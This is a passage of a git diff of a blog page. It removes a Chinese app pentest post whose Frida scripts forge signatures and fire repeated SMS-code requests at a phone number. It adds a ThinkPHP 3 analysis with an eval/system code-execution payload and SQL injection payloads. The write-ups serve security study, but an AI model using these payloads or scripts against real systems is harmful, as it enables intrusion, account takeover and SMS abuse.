@@ -4,10 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一些真实的app渗透与算法hook, wa1ki0g,blog,github">
-    <meta name="description" content="app1apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面
-
-真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：/Users/wa1ki0g/Desktop/利用系统函数与堆栈快速定位ap">
+    <meta name="keywords" content="Thinkphp3全漏洞分析, wa1ki0g,blog,github">
+    <meta name="description" content="这里给大家推荐两个phpdebug的docker容器，也是我一直在用的，不用配置很复杂的环境，即开即用：
+框架介绍基本信息ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache 2开源协议发布，使用面向对象的开">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>一些真实的app渗透与算法hook | wa1ki0g‘s blog</title>
+    <title>Thinkphp3全漏洞分析 | wa1ki0g‘s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -260,12 +259,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一些真实的app渗透与算法hook</h1>
+                    <h1 class="description center-align post-title">Thinkphp3全漏洞分析</h1>
                 </div>
             </div>
         </div>
@@ -389,8 +388,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/app%E5%AE%89%E5%85%A8/" class="post-category">
-                                app安全
+                            <a href="/categories/php%E5%AE%89%E5%85%A8/" class="post-category">
+                                php安全
                             </a>
                         
                     </div>
@@ -402,7 +401,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-03-15
                 </div>
                 
 
@@ -416,14 +415,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    641
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    9 分
                 </div>
                 
 
@@ -438,89 +437,124 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h2><p>apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面</p>
-<p><img src="https://img-blog.csdnimg.cn/b90abb0a24e34fe49de4bb453977e318.png" alt="在这里插入图片描述"></p>
-<p>真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：<br>/Users/wa1ki0g/Desktop/利用系统函数与堆栈快速定位app关键代码.md<br><img src="https://img-blog.csdnimg.cn/893631dc91954b62a5ba243e9baa1e71.png" alt="在这里插入图片描述"></p>
-<p>我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包：</p>
-<p><img src="https://img-blog.csdnimg.cn/f9390f59dbe040919f05247545021bd8.png" alt="在这里插入图片描述"><br>ok，逆一下这个apk，找到算法hook掉就好了，定位一下特征：</p>
-<p><img src="https://img-blog.csdnimg.cn/eb8ce964d9b949acad50ca6a7576f26a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c5644413da8f4a608d70ec23bf6291db.png" alt="在这里插入图片描述"><br>这个函数是发送请求的一个函数，我们观察一下这段代码，可以看到我们最终发出去的sign参数的组成是：（时间 + 类型 + 未知字符 + 手机号），并且这个未知字符是这个函数的一个参数，那好办了。<br>直接hook这个getSmscode函数，看看传来了哪些值，就可以得到这个未知字符，有了这个未知字符我们就可以构建sign</p>
-<p>真机开下frida服务端，做一下端口转发：<br><img src="https://img-blog.csdnimg.cn/6ceb6cb1ac2c4209a4f2b9cb91322eca.png" alt="在这里插入图片描述"></p>
-<p>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> sys
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./bk.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <h2 id="这里给大家推荐两个phpdebug的docker容器，也是我一直在用的，不用配置很复杂的环境，即开即用："><a href="#这里给大家推荐两个phpdebug的docker容器，也是我一直在用的，不用配置很复杂的环境，即开即用：" class="headerlink" title="这里给大家推荐两个phpdebug的docker容器，也是我一直在用的，不用配置很复杂的环境，即开即用："></a><strong>这里给大家推荐两个phpdebug的docker容器，也是我一直在用的，不用配置很复杂的环境，即开即用：</strong></h2><p><img src="https://img-blog.csdnimg.cn/92b856303f5648908d4ea038fb6feb67.png" alt="在这里插入图片描述"></p>
+<h2 id="框架介绍"><a href="#框架介绍" class="headerlink" title="框架介绍"></a>框架介绍</h2><p><strong>基本信息</strong><br>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache 2开源协议发布，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。ThinkPHP可以支持windows/Unix/Linux等服务器环境，正式版需要PHP 5.0以上版本，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展。</p>
+<h2 id="Thinkphp-2-x、3-0-3-1版代码执行漏洞分析"><a href="#Thinkphp-2-x、3-0-3-1版代码执行漏洞分析" class="headerlink" title="Thinkphp 2.x、3.0-3.1版代码执行漏洞分析"></a>Thinkphp 2.x、3.0-3.1版代码执行漏洞分析</h2><p>此漏洞为tp框架中Lite精简模式中存在可能的漏洞，ThinkPHP 开启lite模式后，会加载Lite下的Dispacher.class.php文件去匹配URL并分发用户请求， 而在该文件中的一处使用了perg_replace函数的 /e参数，</p>
+<p><img src="https://img-blog.csdnimg.cn/eff783eacb9343028fefb9c19af4e11b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>此函数/e模式会将其的第二个参数当作php代码执行，而在此文件中一二参数都为可控，\1与\2分别代表着第一个参数中的两个括号的位置，例如当我们传访问的url为index.php?s=1/2/3/4/5/6时，在第一次进行匹配是\1即代表1，\2即代表2，在第二次匹配时\1即代表3，\2即代表4。<br>本地复现：<br><img src="https://img-blog.csdnimg.cn/82768ce7f85a4495af1432faa1541dae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAd2Exa2kwZ34=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>payload:<br>?s=/1/2/3/${eval($_GET[1])}&amp;1=system(%22whoami%22);</p>
+<p>要将我们的payload写到偶数位也就是\2处，原因是\2处为函数的第二个参数处且被双引号包裹，可以解析变量</p>
+<h2 id="thinkphp3-2-3-SQL注入漏洞-where分析"><a href="#thinkphp3-2-3-SQL注入漏洞-where分析" class="headerlink" title="thinkphp3.2.3 SQL注入漏洞-where分析"></a>thinkphp3.2.3 SQL注入漏洞-where分析</h2><p>记得安装mysql_pdo.so。不然连接数据库会报错的</p>
+<p>tp3中的常用方法：</p>
+<pre class=" language-java"><code class="language-java">A快速实例化Action类库
+B执行行为类
+C配置参数存取方法
+D快速实例化Model类库
+F快速简单文本数据存取方法
+L 语言参数存取方法
+M快速高性能实例化模型
+R快速远程调用Action类方法
+S快速缓存存取方法
+U URL动态生成和重定向方法
+W 快速Widget输出方法
+D函数实例化的是你当前项目的Lib<span class="token operator">/</span>Model下面的模块。如果该模块不存在的话，直接返回实例化Model的对象<span class="token punctuation">(</span>意义就与<span class="token function">M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数相同<span class="token punctuation">)</span>。而M只返回，实例化Model的对象。它的$name参数作为数据库的表名来处理对数据库的操作。
+I方法是ThinkPHP众多单字母函数中的新成员，其命名来自于英文Input（输入），主要用于更加方便和安全的获取系统输入变量，可以用于任何地方
+D方法和M方法，这两个方法的区别在于M方法实例化模型无需用户为每个数据表定义模型类，如果D方法没有找到定义的模型类，则会自动调用M方法。通俗一点说：M实例化参数是数据库的表名。D实例化的是你自己在Model文件夹下面建立的模型文件
 </code></pre>
-<pre class=" language-javascript"><code class="language-javascript">Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.CommAction'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSmscode<span class="token punctuation">.</span>implementation<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hook success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"type："</span><span class="token operator">+</span>aa<span class="token punctuation">,</span><span class="token string">"key："</span><span class="token operator">+</span>bb<span class="token punctuation">,</span><span class="token string">"phone："</span><span class="token operator">+</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSmscode</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p>写个控制器：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$Dao</span><span class="token operator">=</span><span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$Dao</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">echo</span><span class="token string">"connect success"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$Dao</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'GET.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
     <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
-<p>hook代码执行监听，手机重新发注册的包，成功监控到：<br><img src="https://img-blog.csdnimg.cn/10954ffaa97c4cb4b513b05c7b5c1868.png" alt="在这里插入图片描述"><br>未知字符找到了，我们用getStringMD5toUpperCase(yyyyMMddHHmmss + i + str + str2) 自己先算一组数据验证下，没有错误：</p>
-<p><img src="https://img-blog.csdnimg.cn/56aab381936e41a2841e6e76eef91eb6.png" alt="在这里插入图片描述"></p>
-<p>这回函数需要的参数我们都拥有了，我们直接通过frida的rpc来调用这个函数，直接给我们生成sign , 并简单写个发送请求的脚本，直接实现一条龙。<br>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> datetime
-<span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://xxxxxx/Appapi/Common/getSmscode'</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-phone <span class="token operator">=</span> <span class="token string">'15149029981'</span>
-type1 <span class="token operator">=</span> <span class="token string">'1'</span>
-
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-
-
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./demo1.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    curr_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    timestamp<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>curr_time<span class="token punctuation">,</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    sign <span class="token operator">=</span> script<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>getsign<span class="token punctuation">(</span>f<span class="token string">'{timestamp}{type1}wocaonima{phone}'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>sign<span class="token punctuation">)</span>
-    dd <span class="token operator">=</span> <span class="token string">'"phone":"{0}","sign":"{1}","currTime":"{2}","type":"1"'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>phone<span class="token punctuation">,</span>sign<span class="token punctuation">,</span>timestamp<span class="token punctuation">)</span>
-    nd <span class="token operator">=</span> <span class="token string">'{'</span><span class="token operator">+</span>dd<span class="token operator">+</span><span class="token string">'}'</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hook success:'</span><span class="token operator">+</span>nd<span class="token punctuation">)</span>
-    userjson<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'userjson'</span><span class="token punctuation">:</span>nd<span class="token punctuation">}</span>
-  
-    talk <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>userjson<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发送成功"</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sign</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-    Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        res <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.network.HttpUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringMD5toUpperCase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-    <span class="token punctuation">}</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> res
 <span class="token punctuation">}</span>
-
-rpc<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">{</span>
-    getsign<span class="token punctuation">:</span>sign
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
 </code></pre>
-<p><strong>第一个漏洞：验证码爆破</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/843a852697fc4eb287a0e1456b57f2f7.png" alt="在这里插入图片描述"></p>
-<p>结果：<br><img src="https://img-blog.csdnimg.cn/536b42d99f384d728859d4623a0cf542.png" alt="在这里插入图片描述"></p>
-<p><strong>第二个漏洞：任意用户密码重置</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/395bd1b23d8d4504b1d0a09549309d6c.png" alt="在这里插入图片描述"></p>
-<p><strong>第三个漏洞：任意用户注册与手机绑定</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/be1a0ae8f4a943d096a663a17e1f53b3.png" alt="在这里插入图片描述"></p>
-<p><strong>第四个漏洞：任意文件上传</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/012f1a46ffce44da8523a2f9ceaa4bc2.png" alt="在这里插入图片描述"></p>
+<p>访问下,我们输入的是id=1’,但是还是对数据库进行了正常查询，我们先简单跟下：<br><img src="https://img-blog.csdnimg.cn/e4ecffb313c240829d0f3293cb2eaf77.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1019460df692468090449831b31a5271.png" alt="在这里插入图片描述"></p>
+<p>进I方法里面看一眼，这个获取我们get传进去的值：</p>
+<p><img src="https://img-blog.csdnimg.cn/933775b1194341f3906fd82ac2b78489.png" alt="在这里插入图片描述"><br>为我们挑选一个过滤器，因为我们一开始对I方法，并没有传入filter，所以我们这里filter的值是null，所以派一个默认的filter给我们：</p>
+<p><img src="https://img-blog.csdnimg.cn/fe1a45cc88a44d1b97743aba098e6f8a.png" alt="在这里插入图片描述"></p>
+<p>C函数我没跟进去看，直接看的idea的返回结果，这里给的filter是：htmlspecialchars</p>
+<p><img src="https://img-blog.csdnimg.cn/71a6d669d938494a818e6e5beef9bb4a.png" alt="在这里插入图片描述"></p>
+<p>但是这玩意貌似不过滤单引号：<br><img src="https://img-blog.csdnimg.cn/32eb8df326674b209815dfd779a70262.png" alt="在这里插入图片描述"></p>
+<p>在下面进行过滤：</p>
+<p><img src="https://img-blog.csdnimg.cn/6bd70c1398984107b79ec8d1d05e7c70.png" alt="在这里插入图片描述"><br>在往下走，走到后面，会回调think_filter这个函数进行过滤：<br><img src="https://img-blog.csdnimg.cn/fa02c44f63f741efbed15ddf1e265f54.png" alt="在这里插入图片描述"></p>
+<p>瞅一眼过滤了啥，这正则对我们当前payload的作用几乎为。。。：<br><img src="https://img-blog.csdnimg.cn/0238b0df0a6043f88ba67900fac5c2a8.png" alt="在这里插入图片描述"></p>
+<p>回到过去，最后返回的还是1’ ，没过滤掉根本：</p>
+<p><img src="https://img-blog.csdnimg.cn/0d0f52f4d3f94ba5acd6daa49ea352ff.png" alt="在这里插入图片描述"><br>接着进了find方法，这里给options赋值，赋成了二维数组：<br><img src="https://img-blog.csdnimg.cn/c6cd89ad479142908b7b587045b4ff42.png" alt="在这里插入图片描述"><br>    我这里重新换了个pyload:1’and%201=1%23,打个断点直接到这:<br><img src="https://img-blog.csdnimg.cn/1de52411adff41f39775fb7536d257e8.png" alt="在这里插入图片描述"><br>接着往下走，会有些对id参数是否是数组的判断，我们这里都进不去。就往下跟我们发现在这下面这个地方，我们的1’and%201=1%23变成了1：<br><img src="https://img-blog.csdnimg.cn/1d27d8a5bc9b4b8aaf9cfd818c0bce09.png" alt="在这里插入图片描述"><br>对这个函数打个断点，进去瞅下发现有个parseType函数：<br><img src="https://img-blog.csdnimg.cn/6153899d9eab4daba52232d88bc0d19b.png" alt="在这里插入图片描述"></p>
+<p>跟进去看看，这个函数是判断了我们数据库里的这个字段的类型，然后进行相应的处理，我这里用的是id参数，是int型，所以他直接用intval做了个强转，我们的1’and%201=1%23就是在这里变成了1：<br><img src="https://img-blog.csdnimg.cn/9408dc49d397452983f6044db156ccec.png" alt="在这里插入图片描述"><br>我们进数据库把id类型改成string，然后在断点定位到这,跳过了这个parseType函数，接着走到了查询的地方，跟进下：<br><img src="https://img-blog.csdnimg.cn/3d5d1742d512429b9cb078bc95b98f96.png" alt="在这里插入图片描述"><br>发现了在buildSelectSql处单引号被转意：</p>
+<p><img src="https://img-blog.csdnimg.cn/1f5cc1ba6cdb49da8eaed28a927e2474.png" alt="在这里插入图片描述"><br>打个断点跟进buildSelectSql处：<br><img src="https://img-blog.csdnimg.cn/055b9459b95a47338ac9acaef1f9b037.png" alt="在这里插入图片描述"></p>
+<p>跟进parsesql函数：<br><img src="https://img-blog.csdnimg.cn/7e085a74053e474d817c13ffd329cd2e.png" alt="在这里插入图片描述"><br>跟进去where那个：</p>
+<p><img src="https://img-blog.csdnimg.cn/0c89fea1aac94a5e9aeb5591d0a50523.png" alt="在这里插入图片描述"><br>在跟进去这个解析相关的函数：<br><img src="https://img-blog.csdnimg.cn/3288913486f74e58a7fc7e341db87b8c.png" alt="在这里插入图片描述"><br>在跟下这个parsevalue：<br><img src="https://img-blog.csdnimg.cn/532806d20a064106a9173f62d10bae50.png" alt="在这里插入图片描述"><br>第一个if通过了，这里执行了这个escapeString，跟进一下这个escapeString函数，可以看到就是在这里对我们的单引号进行了转意：<br><img src="https://img-blog.csdnimg.cn/361514e2062e44759fe0622d47c028a5.png" alt="在这里插入图片描述"></p>
+<p>数字，字符都不行，只能尝试数组，看看在有些条件判断处能否进行一个绕过</p>
+<p><strong>payload1</strong></p>
+<p>我们传入的参数，是在_parseType()中被强转为int，如果我传?id[where]=1 and 1=1时根本不会进入这个if，更不用说进入强转的那个函数：</p>
+<p><img src="https://img-blog.csdnimg.cn/19ce14dbe7fe4a46a62d21b823d58d74.png" alt="在这里插入图片描述"><br>我们不传数组时的，到这的options中的where是个数组，所以会进到那个强转的函数：<br><img src="https://img-blog.csdnimg.cn/aa8d224a13f049229a003b58dde74aa0.png" alt="在这里插入图片描述"></p>
+<p>再往下走，因为这回$where变成了字符串，所以在parseWhere这里直接拼接成了语句，依次返回执行：<br><img src="https://img-blog.csdnimg.cn/c6acdf6188aa453781721eb0b90102ee.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d58c6cff977f4e46893b94fb3c56625e.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/02a6c3897811494996f816fb233ac612.png" alt="在这里插入图片描述"><br>结果：<br><img src="https://img-blog.csdnimg.cn/ea0669b26d904882ba7589ca3dd31085.png" alt="在这里插入图片描述"></p>
+<h2 id="thinkphp3-2-3-SQL注入漏洞-exp注入分析"><a href="#thinkphp3-2-3-SQL注入漏洞-exp注入分析" class="headerlink" title="thinkphp3.2.3 SQL注入漏洞-exp注入分析"></a>thinkphp3.2.3 SQL注入漏洞-exp注入分析</h2><p>payload:<code>?name[0]=exp&amp;name[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</code><br>控制器：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+namespace Home\Controller<span class="token punctuation">;</span>
+use Think\Controller<span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        $User <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'Users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $map <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span> $_GET<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        $user <span class="token operator">=</span> $User<span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span>$map<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span>$user<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里的写法可以类比一下where注入的那个控制器，where注入的传参方式是I(‘GET.id’)，而这里是 $map = array(‘name’ =&gt; $_GET[‘name’])与where($map)结合，这个原因放到最后说，这可以打个断点，看看where函数主要做了什么：</p>
+<p><img src="https://img-blog.csdnimg.cn/c3aa37d8e1254d639afe8d075a1185f9.png" alt="在这里插入图片描述"></p>
+<p>主要在where函数里就做了个赋值操作，主要是赋值以后的find操作，我们跟进去看看，跟进以后的大多数过程都和之前比较类似，直到这里parseSql里的parseWhere方法：<br><img src="https://img-blog.csdnimg.cn/1316ecbea6de4d7bb061ee4a67bb2be3.png" alt="在这里插入图片描述"></p>
+<p>跟进去parseWherer以后，主要是parseWhereItem方法，跟进去看看</p>
+<p><img src="https://img-blog.csdnimg.cn/dd9a94a5269d4ba9bec29e685ed1eee7.png" alt="在这里插入图片描述"></p>
+<p>首先会对$exp进行赋值，赋的值就是我们传入的 name[0]=exp<br><img src="https://img-blog.csdnimg.cn/141de8d0a2d94cb5a8b32246f6e364ca.png" alt="在这里插入图片描述"><br>之后会进行一个判断，拼接这一步是比较重要的：<br><img src="https://img-blog.csdnimg.cn/675b636b977146ea82743e936c8b0f21.png" alt="在这里插入图片描述"><br>拼接以后会逐步递归返回，最后进行执行：<br><img src="https://img-blog.csdnimg.cn/1519fe31ea7f42fbbf75adeaea158d57.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/985e39235b6f42b38d01a2c91df0922e.png" alt="在这里插入图片描述"></p>
+<p>再说一下，这里为什么不能用I(‘GET.id’)进行传参，在我们调试where注入的时候，用I(‘GET.id’)进行传参时，会有一个think_filter进行过滤如下图，正则里写了”exp“：</p>
+<p><img src="https://img-blog.csdnimg.cn/e252bbc6915245edb1ebeb807e1d57b1.png" alt="在这里插入图片描述"><br>结果：</p>
+<p><img src="https://img-blog.csdnimg.cn/d15c31872dff4fd5b8c36521efedee6f.png" alt="在这里插入图片描述"></p>
+<h2 id="thinkphp3-2-3-SQL注入漏洞-bind注入分析"><a href="#thinkphp3-2-3-SQL注入漏洞-bind注入分析" class="headerlink" title="thinkphp3.2.3 SQL注入漏洞-bind注入分析"></a>thinkphp3.2.3 SQL注入漏洞-bind注入分析</h2><p>控制器：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+namespace Home\Controller<span class="token punctuation">;</span>
+use Think\Controller<span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        $User <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">"users"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
